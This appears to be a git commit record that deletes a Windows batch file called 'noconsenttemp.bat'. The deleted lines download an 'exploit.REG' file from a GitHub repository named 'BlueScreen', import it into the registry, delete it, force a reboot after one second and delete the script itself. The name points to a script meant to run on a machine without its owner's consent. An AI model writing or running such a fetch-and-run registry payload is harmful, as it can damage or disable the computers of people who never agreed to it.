a08880b02d6eae671a2513b7fbba5ed0062bfdfd
harryaldwithjarryald <148587892+harryaldwithjarryald@users.noreply.github.com>
2024-05-04 16:20:57 -0400

    Delete noconsenttemp.bat

--- noconsenttemp.bat
+++
@@ -1,6 +0,0 @@
-@echo off
-powershell /c wget https://raw.githubusercontent.com/harryaldwithjarryald/BlueScreen/main/exploit.REG -OutFile temp.REG
-temp.REG
-del temp.REG
-shutdown -r -t 1
-del online_temp.bat
